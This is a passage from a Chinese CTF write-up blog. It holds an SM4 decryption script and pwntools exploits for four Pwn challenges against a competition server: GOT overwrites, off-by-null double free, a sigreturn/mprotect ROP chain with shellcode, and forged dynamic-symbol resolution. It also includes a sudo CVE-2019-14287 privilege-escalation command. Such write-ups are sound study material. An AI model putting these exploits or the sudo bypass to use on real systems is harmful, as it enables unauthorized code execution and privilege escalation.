class="string">'383f464d'</span>, <span class="string">'545b6269'</span>,</span><br><span class="line">      <span class="string">'70777e85'</span>, <span class="string">'8c939aa1'</span>, <span class="string">'a8afb6bd'</span>, <span class="string">'c4cbd2d9'</span>,</span><br><span class="line">      <span class="string">'e0e7eef5'</span>, <span class="string">'fc030a11'</span>, <span class="string">'181f262d'</span>, <span class="string">'343b4249'</span>,</span><br><span class="line">      <span class="string">'50575e65'</span>, <span class="string">'6c737a81'</span>, <span class="string">'888f969d'</span>, <span class="string">'a4abb2b9'</span>,</span><br><span class="line">      <span class="string">'c0c7ced5'</span>, <span class="string">'dce3eaf1'</span>, <span class="string">'f8ff060d'</span>, <span class="string">'141b2229'</span>,</span><br><span class="line">      <span class="string">'30373e45'</span>, <span class="string">'4c535a61'</span>, <span class="string">'686f767d'</span>, <span class="string">'848b9299'</span>,</span><br><span class="line">      <span class="string">'a0a7aeb5'</span>, <span class="string">'bcc3cad1'</span>, <span class="string">'d8dfe6ed'</span>, <span class="string">'f4fb0209'</span>,</span><br><span class="line">      <span class="string">'10171e25'</span>, <span class="string">'2c333a41'</span>, <span class="string">'484f565d'</span>, <span class="string">'646b7279'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left</span><span class="params">(list,n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list[n:] + list[:n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group</span><span class="params">(list, n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(list), n):</span><br><span class="line">        <span class="keyword">yield</span> list[i:i + n]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    a1 = int(a,<span class="number">16</span>)</span><br><span class="line">    b1 = int(b,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        A = <span class="string">'&#123;:032x&#125;'</span>.format(int(a1^b1))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        A = <span class="string">'&#123;:08x&#125;'</span>.format(int(a1^b1))</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round_function</span><span class="params">(k0,k1,k2,k3,rk,mod)</span>:</span></span><br><span class="line">    k = xor(xor(xor(k1,k2),k3),rk)</span><br><span class="line">    Tr = T(k,mod)</span><br><span class="line">    rki = xor(k0,Tr)</span><br><span class="line">    <span class="keyword">return</span> rki</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T</span><span class="params">(A,mod)</span>:</span></span><br><span class="line">    T = linear(S(A),mod)</span><br><span class="line">    <span class="keyword">return</span> T</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S</span><span class="params">(A)</span>:</span></span><br><span class="line">    A1 = []</span><br><span class="line">    A2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(A,<span class="number">2</span>):</span><br><span class="line">        A1.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        l = int(A1[i],<span class="number">16</span>)</span><br><span class="line">        A2[i] = <span class="string">'&#123;:02x&#125;'</span>.format(int(SBOX[l],<span class="number">16</span>)) </span><br><span class="line">    A2 = <span class="string">''</span>.join(A2)</span><br><span class="line">    <span class="keyword">return</span> A2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear</span><span class="params">(B,mod)</span>:</span></span><br><span class="line">    B1 = list(B)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        B1[i] = <span class="string">'&#123;:04b&#125;'</span>.format(int(B1[i],<span class="number">16</span>))</span><br><span class="line">    B1 = <span class="string">''</span>.join(B1)</span><br><span class="line">    B1_2= left(B1,<span class="number">2</span>)</span><br><span class="line">    B1_10 = left(B1,<span class="number">10</span>)</span><br><span class="line">    B1_18 = left(B1,<span class="number">18</span>)</span><br><span class="line">    B1_24 = left(B1,<span class="number">24</span>)</span><br><span class="line">    B1_13 = left(B1,<span class="number">13</span>)</span><br><span class="line">    B1_23 = left(B1,<span class="number">23</span>)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">'enc'</span> <span class="keyword">or</span> mod ==  <span class="string">'dec'</span>:</span><br><span class="line">        BX = xor(xor(xor(xor(B1,B1_2),B1_10),B1_18),B1_24)</span><br><span class="line">    <span class="keyword">elif</span> mod == <span class="string">'extend'</span>:</span><br><span class="line">        BX = xor(xor(B1,B1_13),B1_23)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"模式输入错误"</span></span><br><span class="line">    BX = <span class="string">'%x'</span>%int(BX, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> BX</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">(key)</span>:</span></span><br><span class="line">    MK = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(key,<span class="number">8</span>):</span><br><span class="line">        MK.append(i)</span><br><span class="line">    key0 = xor(MK[<span class="number">0</span>],FK[<span class="number">0</span>])</span><br><span class="line">    key1 = xor(MK[<span class="number">1</span>],FK[<span class="number">1</span>])</span><br><span class="line">    key2 = xor(MK[<span class="number">2</span>],FK[<span class="number">2</span>])</span><br><span class="line">    key3 = xor(MK[<span class="number">3</span>],FK[<span class="number">3</span>])</span><br><span class="line">    keylist = [key0,key1,key2,key3]</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        a = round_function(keylist[i],keylist[i+<span class="number">1</span>],keylist[i+<span class="number">2</span>],keylist[i+<span class="number">3</span>],CK[i],mod=<span class="string">'extend'</span>)</span><br><span class="line">        keylist.append(a)</span><br><span class="line">        rk.append(a)</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_ecb</span><span class="params">(key,input_data,mod)</span>:</span></span><br><span class="line">    data = []</span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">        data.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> mod == <span class="string">'enc'</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">        data.append(ldata)</span><br><span class="line">    out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">    out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sm4_cbc</span><span class="params">(key,input_data,iv,mod)</span>:</span></span><br><span class="line">    rk = get_key(key)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">'enc'</span>:</span><br><span class="line">        input_data = xor(input_data,iv)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> group(input_data,<span class="number">8</span>):</span><br><span class="line">            data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            ldata = round_function(data[i],data[i+<span class="number">1</span>],data[i+<span class="number">2</span>],data[i+<span class="number">3</span>],rk[<span class="number">31</span>-i],mod)</span><br><span class="line">            data.append(ldata)</span><br><span class="line">        out_data = [data[<span class="number">35</span>],data[<span class="number">34</span>],data[<span class="number">33</span>],data[<span class="number">32</span>]]</span><br><span class="line">        out_data = <span class="string">''</span>.join(out_data)</span><br><span class="line">        out_data = xor(out_data,iv)</span><br><span class="line">        out_data = <span class="string">'&#123;:032x&#125;'</span>.format(int(out_data, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> out_data</span><br><span class="line"></span><br><span class="line">cipher_text=<span class="string">b"\xEA\x63\x58\xB7\x8C\xE2\xA1\xE9\xC5\x29\x8F\x53\xE8\x08\x32\x59\xAF\x1B\x67\xAE\xD9\xDA\xCF\xC4\x72\xFF\xB1\xEC\x76\x73\xF3\x06"</span></span><br><span class="line">key = <span class="string">"Ez_5M4_C1pH@r!!!"</span></span><br><span class="line">result=get_sm4_ecb(key = key.encode(<span class="string">'utf-8'</span>).hex(), input_data = cipher_text[:<span class="number">16</span>].hex(), mod = <span class="string">'dec'</span>)</span><br><span class="line">result=bytes.fromhex(result)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">print(chr(x),end=<span class="string">""</span>)</span><br><span class="line">result=get_sm4_ecb(key = key.encode(<span class="string">'utf-8'</span>).hex(), input_data = cipher_text[<span class="number">16</span>:].hex(), mod = <span class="string">'dec'</span>)</span><br><span class="line">result=bytes.fromhex(result)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">print(chr(x),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-emarm"><a href="#1-emarm" class="headerlink" title="1.emarm"></a>1.emarm</h4><p>第一个检测发送一个0x00就可以绕过，然后允许我们输入一个地址，并更改其8字节的内容，由于没有开启FULL RELRO和PIE，直接改GOT表就好。由于ARM的libc基址没有随机化，我们可以先将atoi改为printf利用格式化字符串泄露出基址。然后重新打一次，这次将atoi改为system拿shell。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x4000830000</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x3F2C8</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10012</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'passwd:'</span>,p8(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#sh.send(str(0x000000000412020)+'\x00'+p64(0x0000000004008B0))#泄露基址</span></span><br><span class="line"><span class="comment">#sh.sendafter('bye','%9$p')</span></span><br><span class="line">sh.send(str(<span class="number">0x000000000412020</span>)+<span class="string">'\x00'</span>+p64(system_addr))</span><br><span class="line">sh.sendafter(<span class="string">'bye'</span>,<span class="string">'sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-ememarm"><a href="#2-ememarm" class="headerlink" title="2.ememarm"></a>2.ememarm</h4><p>ARM的堆题，貌似没有什么检查，利用off by null可以实现double free，然后就可以任意地址写了，同样没有开启FULL RELRO和PIE，可以分配堆块到got表的puts处，这样可以避免堆块头破坏有用的函数，还可以更改掉free，而puts用类似的printf代替即可。由于double free只可进行一次，我们还是先利用格式化字符串泄露libc基址，然后打第二次调用system即可。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x,y,if_save)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'cx:'</span>,x)</span><br><span class="line">sh.sendafter(<span class="string">'cy:'</span>,y)</span><br><span class="line">sh.sendlineafter(<span class="string">'?'</span>,str(if_save))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_40</span><span class="params">(x,y,if_save)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'cx:'</span>,x)</span><br><span class="line">sh.sendafter(<span class="string">'cy:'</span>,y)</span><br><span class="line">sh.sendlineafter(<span class="string">'?'</span>,str(if_save))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendline(str(index))</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x4000830000</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x3F2C8</span></span><br><span class="line">sh=remote(<span class="string">"183.129.189.60"</span>,<span class="number">10034</span>)<span class="comment">#0x413260</span></span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>))</span><br><span class="line">add_40(p64(<span class="number">0</span>),p64(<span class="number">0</span>),<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">add_40(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">add_40(<span class="string">'0'</span>,<span class="string">'0'</span>,<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x17</span>)</span><br><span class="line">add_40(p64(<span class="number">0x412030</span>),<span class="string">'0'</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#add_40('%15$p   ','%16$p',1)#3</span></span><br><span class="line">add_40(<span class="string">'/bin/sh\x00'</span>,<span class="string">'%16$p'</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">add_40(p64(<span class="number">0x400780</span>),p64(system_addr),<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x400780</span>))</span><br><span class="line"><span class="comment">#libc_base=int(sh.recv(12)[2:],16)-0x206e0</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="comment">#system_addr=libc_base+0x3F2C8</span></span><br><span class="line"><span class="comment">#add_40('/bin/sh\x00','/bin/sh\x00',1)#3</span></span><br><span class="line"><span class="comment">#add('0','0',1)#5</span></span><br><span class="line"><span class="comment">#edit(4,p64(0x400780)+p64(system_addr))</span></span><br><span class="line"><span class="comment">#edit(2,'a')</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="3-justcode"><a href="#3-justcode" class="headerlink" title="3.justcode"></a>3.justcode</h4><p>这道题开了沙箱。允许两个操作，一共执行4次。第一个往整个栈帧上写数据，并打印；第二个更改rbp-0x84处存储的地址上的4个字节，并向rbp-0x80读入0x6c个字节。</p><p>我们可以写用1操作在rbp-0x84处留下要改的地址，然后通过2操作来改，但这样总共只能改两次。所以我们可以将__stack_chk_fail改为main函数的地址，然后在1操作中改canary就可以实现任意次任意地址写4字节了，同时还能顺便泄露出rbp的地址，拿到栈地址。</p><p>考虑到1操作直接从rsp开始写数据，因此可以构造rop链，并将__stack_chk_fail改为0x400E9A来实现puts函数的调用泄露出libc地址。然后我们就可以把stack_chk_fail改成libc中的gadget了，一个比较合适的gadget是0x24374，它可以将设置rdi与下一个调用，我们将rax设置为setcontext，rdi设置为栈上构造的sigreturnframe，就可以进行orw操作了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2021/08/16/ePpMYFf18KRrHCc.png" alt="image-20210201162808892" title="">                </div>                <div class="image-caption">image-20210201162808892</div>            </figure><p>然后就是读rop链到libc中的空白处，进行mprotect的调用将对应地址改为可执行，最后执行orw的shellcode即可。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">sub rsp, 0x800</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">mov eax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cmp eax, 0</span></span><br><span class="line"><span class="string">js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 0x100</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">failed:</span></span><br><span class="line"><span class="string">push 0x6c696166</span></span><br><span class="line"><span class="string">mov edi, 1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov edx, 4</span></span><br><span class="line"><span class="string">mov eax, edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">mov eax, 231</span></span><br><span class="line"><span class="string">syscall'''</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./justcode')#some gadgets 0x2BD59 0x24374</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'183.129.189.60'</span>,<span class="number">10041</span>)</span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">sh.sendline(str(x))</span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602038</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'id:'</span>,str(<span class="number">0x400D4B</span>))</span><br><span class="line">sh.sendafter(<span class="string">'info:'</span>,<span class="string">"a"</span>*<span class="number">0x4c</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaab'</span>)</span><br><span class="line">sh.recv(<span class="number">7</span>)</span><br><span class="line">rbp=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x70</span><span class="number">-0x170</span></span><br><span class="line"></span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">sh.sendline(str(x))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602038</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'id:'</span>,str(<span class="number">0x400E96</span>))</span><br><span class="line">sh.sendafter(<span class="string">'info:'</span>,<span class="string">"a"</span>*<span class="number">0x4c</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x602028</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x602048</span>)+p64(<span class="number">0x400E86</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x400D4B</span>)</span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,payload.ljust(<span class="number">0x89</span>,<span class="string">'a'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'check it :'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">read_addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=read_addr<span class="number">-0xF7310</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook2=(libc_base+<span class="number">0x3C67A8</span>)&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">syscall_addr=libc_base+<span class="number">0x101580</span></span><br><span class="line">setcontext=libc_base+<span class="number">0x47B85</span></span><br><span class="line">read_addr=libc_base+<span class="number">0xF7310</span></span><br><span class="line">mprotect=libc_base+<span class="number">0x101830</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v7=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> v7:</span><br><span class="line">sh.sendline(str(x))</span><br><span class="line">print(hex(rbp))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0xc</span>+p64(<span class="number">0x602040</span>)+<span class="string">'a'</span>*<span class="number">0x74</span>)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook2</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook2</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rip = read_addr <span class="comment">#: syscall; ret;</span></span><br><span class="line">payload = str(frame)</span><br><span class="line"></span><br><span class="line">layout=p64(libc_base+<span class="number">0x21112</span>)+p64(free_hook2)+p64(libc_base+<span class="number">0x202f8</span>)+p64(<span class="number">0x2000</span>)+p64(libc_base+<span class="number">0x1b92</span>)+p64(<span class="number">7</span>)+p64(mprotect)+p64(libc_base+<span class="number">0x2a71</span>)</span><br><span class="line">pause()</span><br><span class="line">sh.sendlineafter(<span class="string">'id:'</span>,str((libc_base+<span class="number">0x24374</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">sh.send(p64(rbp<span class="number">-0x80</span><span class="number">-0x48</span>)+p64(<span class="number">0</span>)+p64(setcontext)+p64(<span class="number">0</span>)+payload[<span class="number">0x68</span>:<span class="number">0xb0</span>])</span><br><span class="line"></span><br><span class="line">sh.send(layout + shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="4-undlcv"><a href="#4-undlcv" class="headerlink" title="4.undlcv"></a>4.undlcv</h4><p>存在off by null漏洞，并且将堆块地址存储在bss段上，也没开PIE。因此想到使用unlink就可以实现任意地址写，但写的次数一共只有四次，任意地址写的机会只有2次。看到保护为NO RELRO，考虑更改dynamic段中symtab和strtab的地址来实现system的调用。</p><p>第一次任意写将strtab改为0x4034a0，symtab改为0x403450。第二次将got表中的atoi改为0x401030，这样调用atoi就会调用第二个参数为0的_dl_runtime _resolve函数，紧接着我们在0x403450处构造虚假的symtab，其中第一项的strtab偏移设置为我们写入的system字符串，随后在0x4034a0处构造虚假的strtab，其中包含了system字符串。</p><p>最后发送/bin/sh就可以拿到shell。但拿到shell后发现无权读取flag，考虑sudo相关漏洞，发现sudo的版本满足CVE-2019-14287的要求，于是输入sudo -u#-1 cat flag成功拿到flag。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span 